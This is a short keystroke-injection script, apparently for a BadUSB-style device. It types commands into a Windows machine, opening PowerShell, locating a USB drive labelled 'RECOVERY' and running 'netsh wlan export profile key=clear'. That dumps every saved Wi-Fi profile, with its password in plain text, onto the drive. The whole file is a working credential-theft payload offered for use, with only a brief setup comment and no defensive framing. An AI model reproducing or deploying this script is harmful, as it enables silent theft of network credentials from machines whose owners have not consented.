// Standard dump wifi keys, adapted for slow speed laptops.

// Note you need to make a USB Mass storage device for this,
// Mine is called 'Recovery', but you can change it in the code below.

  
layout('us') 
press("GUI r")
delay(500)
type("powershell\n") 
delay(600)
type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'RECOVERY' } | select name \n") // Swap RECOVERY with drive name 
delay(500)
type("cd $usbpath.name\n")
delay(500)
type("netsh wlan export profile key=clear\n")
delay(500)
type("exit\n")